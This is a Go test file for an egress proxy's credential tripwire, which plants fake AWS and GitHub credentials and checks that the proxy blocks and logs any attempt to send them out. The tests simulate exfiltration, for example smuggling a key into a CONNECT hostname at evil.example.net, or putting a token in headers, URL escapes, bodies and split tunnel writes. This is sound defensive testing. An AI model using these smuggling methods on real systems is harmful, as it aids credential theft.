package egress

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestEachJobsFakeCredentialsAreItsOwnAndShapedLikeRealOnes(t *testing.T) {
	a, err := NewTripwire()
	if err != nil {
		t.Fatal(err)
	}
	b, _ := NewTripwire()
	if !regexp.MustCompile(`^AKIA[A-Z2-7]{16}$`).MatchString(a.AWSKeyID) {
		t.Errorf("key id %q isn't shaped like an AWS one", a.AWSKeyID)
	}
	if !regexp.MustCompile(`^[A-Za-z0-9]{40}$`).MatchString(a.AWSSecret) {
		t.Errorf("secret %q isn't shaped like an AWS one", a.AWSSecret)
	}
	if !regexp.MustCompile(`^ghp_[A-Za-z0-9]{36}$`).MatchString(a.GitHubToken) {
		t.Errorf("token %q isn't shaped like a GitHub one", a.GitHubToken)
	}
	if a.AWSKeyID == b.AWSKeyID || a.AWSSecret == b.AWSSecret || a.GitHubToken == b.GitHubToken {
		t.Error("two jobs got the same fake credentials")
	}
	files := a.Files()
	aws := files[".aws/credentials"]
	if !strings.Contains(aws, "aws_access_key_id = "+a.AWSKeyID) || !strings.Contains(aws, "aws_secret_access_key = "+a.AWSSecret) {
		t.Errorf("~/.aws/credentials:\n%s", aws)
	}
	if gh := files[".config/gh/hosts.yml"]; !strings.Contains(gh, "github.com:\n    oauth_token: "+a.GitHubToken) {
		t.Errorf("~/.config/gh/hosts.yml:\n%s", gh)
	}
}

// tripRig is a rig whose proxy watches for tw's values.
func tripRig(t *testing.T, h http.Handler, rules ...Rule) (*rig, *Tripwire, func() []string) {
	t.Helper()
	r := newRig(t, h, "", rules...)
	tw := newTripwire("AKIA"+"ABCDEFGHIJKLMNOP", strings.Repeat("s3cr3t", 6)+"Zz", "ghp_"+strings.Repeat("Tok3n", 7)+"X")
	var mu sync.Mutex
	var seen []string
	r.p.Watch(tw, func(what string) { mu.Lock(); seen = append(seen, what); mu.Unlock() })
	return r, tw, func() []string { mu.Lock(); defer mu.Unlock(); return append([]string(nil), seen...) }
}

func TestAFakeCredentialInACONNECTsTargetTripsTheWire(t *testing.T) {
	r, tw, seen := tripRig(t, http.HandlerFunc(hello), Rule{"api.example.com", 443})
	// Smuggled in a name, lower case, its prefix dropped: still the value.
	host := strings.ToLower(strings.TrimPrefix(tw.AWSKeyID, "AKIA")) + ".evil.example.net:443"
	if code, _, _ := connect(t, r.addr(), host); code != http.StatusForbidden {
		t.Fatalf("CONNECT %s: %d, want 403", host, code)
	}
	got := seen()
	if len(got) != 1 || !strings.Contains(got[0], "the AWS access key id") || !strings.Contains(got[0], "evil.example.net") {
		t.Fatalf("seen: %q", got)
	}
	if !strings.Contains(r.logs.all(), "tripwire: the job's fake credentials were seen leaving") {
		t.Errorf("the job's log doesn't say:\n%s", r.logs.all())
	}
	// Once: a second sighting calls nothing more.
	connect(t, r.addr(), host)
	if n := len(seen()); n != 1 {
		t.Errorf("called %d times, want once", n)
	}
}

func TestAFakeCredentialInAnAllowedCONNECTsHeadersTripsTheWire(t *testing.T) {
	r, tw, seen := tripRig(t, http.HandlerFunc(hello), Rule{"api.example.com", 443})
	c, err := net.Dial("tcp", r.addr())
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close()
	login := base64.StdEncoding.EncodeToString([]byte("x:" + tw.GitHubToken))
	fmt.Fprintf(c, "CONNECT api.example.com:443 HTTP/1.1\r\nHost: api.example.com:443\r\nProxy-Authorization: Basic %s\r\n\r\n", login)
	c.SetReadDeadline(time.Now().Add(5 * time.Second))
	line, _ := io.ReadAll(io.LimitReader(c, 12))
	if !strings.Contains(string(line), "403") {
		t.Fatalf("an allowed host with the token in a Basic login: %q", line)
	}
	if got := seen(); len(got) != 1 || !strings.Contains(got[0], "the GitHub token, in the Proxy-Authorization header") {
		t.Fatalf("seen: %q", got)
	}
}

func TestAFakeCredentialInAPlainRequestTripsTheWire(t *testing.T) {
	for name, send := range map[string]func(r *rig, tw *Tripwire) (*http.Response, error){
		"the URL, %-escaped": func(r *rig, tw *Tripwire) (*http.Response, error) {
			var esc strings.Builder
			for _, b := range []byte(tw.AWSSecret) {
				fmt.Fprintf(&esc, "%%%02X", b)
			}
			return r.client().Get("http://pkg.example.com/?k=" + esc.String())
		},
		"a header": func(r *rig, tw *Tripwire) (*http.Response, error) {
			req, _ := http.NewRequest("GET", "http://pkg.example.com/", nil)
			req.Header.Set("Authorization", "token "+tw.GitHubToken)
			return r.client().Do(req)
		},
		"the body": func(r *rig, tw *Tripwire) (*http.Response, error) {
			// Past a read's worth, so the value spans two reads.
			body := strings.Repeat("x", 70000) + tw.AWSSecret + strings.Repeat("y", 70000)
			return r.client().Post("http://pkg.example.com/up", "text/plain", strings.NewReader(body))
		},
	} {
		t.Run(name, func(t *testing.T) {
			got := make(chan string, 1)
			h := http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
				b, _ := io.ReadAll(req.Body)
				select {
				case got <- string(b):
				default:
				}
			})
			r, tw, seen := tripRig(t, h, Rule{"pkg.example.com", 80})
			resp, err := send(r, tw)
			if err == nil {
				resp.Body.Close()
				if resp.StatusCode == http.StatusOK {
					t.Errorf("the request went through: %d", resp.StatusCode)
				}
			}
			if s := seen(); len(s) != 1 {
				t.Fatalf("seen: %q", s)
			}
			select {
			case b := <-got:
				if strings.Contains(b, tw.AWSSecret) {
					t.Error("the upstream got the value")
				}
			default:
			}
		})
	}
}

func TestAFakeCredentialSentThroughATunnelInPlainTextTripsTheWire(t *testing.T) {
	r, tw, seen := tripRig(t, http.HandlerFunc(hello), Rule{"api.example.com", 80})
	code, c, br := connect(t, r.addr(), "api.example.com:80")
	if code != http.StatusOK {
		t.Fatalf("CONNECT: %d", code)
	}
	// Split across two writes.
	half := len(tw.GitHubToken) / 2
	fmt.Fprintf(c, "GET /?t=%s", tw.GitHubToken[:half])
	time.Sleep(50 * time.Millisecond)
	fmt.Fprintf(c, "%s HTTP/1.1\r\nHost: api.example.com\r\n\r\n", tw.GitHubToken[half:])
	c.SetReadDeadline(time.Now().Add(5 * time.Second))
	body, _ := io.ReadAll(br)
	if strings.Contains(string(body), "hello") {
		t.Errorf("the request reached the upstream: %q", body)
	}
	if s := seen(); len(s) != 1 || !strings.Contains(s[0], "the GitHub token, in what the job sent through the tunnel") {
		t.Fatalf("seen: %q", s)
	}
}

func TestAJobThatSendsNoFakeCredentialTripsNothing(t *testing.T) {
	r, _, seen := tripRig(t, http.HandlerFunc(hello), Rule{"pkg.example.com", 80}, Rule{"api.example.com", 443})
	resp, err := r.client().Post("http://pkg.example.com/x?AKIA=1", "text/plain", strings.NewReader("ghp_ AKIA aws_secret_access_key"))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("an ordinary request: %d", resp.StatusCode)
	}
	code, c, br := connect(t, r.addr(), "api.example.com:443")
	if code != http.StatusOK {
		t.Fatalf("CONNECT: %d", code)
	}
	fmt.Fprintf(c, "GET /through HTTP/1.1\r\nHost: api.example.com\r\nConnection: close\r\n\r\n")
	if body, _ := io.ReadAll(br); !strings.Contains(string(body), "hello /through") {
		t.Fatalf("through the tunnel: %q", body)
	}
	if s := seen(); len(s) != 0 {
		t.Fatalf("tripped on nothing: %q", s)
	}
}
